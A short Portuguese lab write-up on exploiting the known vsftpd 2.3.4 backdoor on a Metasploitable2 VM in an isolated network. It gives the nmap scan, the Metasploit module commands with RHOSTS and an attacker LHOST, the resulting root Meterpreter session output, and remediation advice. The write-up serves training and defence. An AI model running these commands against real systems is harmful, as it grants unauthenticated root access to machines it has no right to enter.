# Writeup: Exploração VSFTPD 2.3.4 Backdoor - Metasploitable2

## Ambiente
- Atacante: Kali Linux (VM VirtualBox)
- Alvo: Metasploitable2 (VM VirtualBox)
- Rede: Internal Network isolada (192.168.56.0/24)

## 1. Reconhecimento
Varredura de portas e serviços com Nmap:

    nmap -sV 192.168.56.10

Identificadas 23 portas abertas, incluindo vsftpd 2.3.4 na porta 21/tcp.

## 2. Identificação da vulnerabilidade
A versão vsftpd 2.3.4 possui um backdoor conhecido publicamente
(inserido maliciosamente no código-fonte em 2011), que pode ser
ativado remotamente para obter execução de comando.

## 3. Exploração
Uso do módulo do Metasploit Framework:

    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOSTS 192.168.56.10
    set LHOST 192.168.56.11
    exploit

Resultado: sessão Meterpreter aberta com sucesso.

## 4. Confirmação de acesso
    getuid          -> root
    whoami          -> root
    id              -> uid=0(root) gid=0(root)

## Conclusão
Acesso root obtido sem autenticação, explorando um backdoor
conhecido em um serviço desatualizado. Como correção: atualizar
o vsftpd para uma versão sem o código malicioso, e nunca expor
serviços FTP desatualizados publicamente.
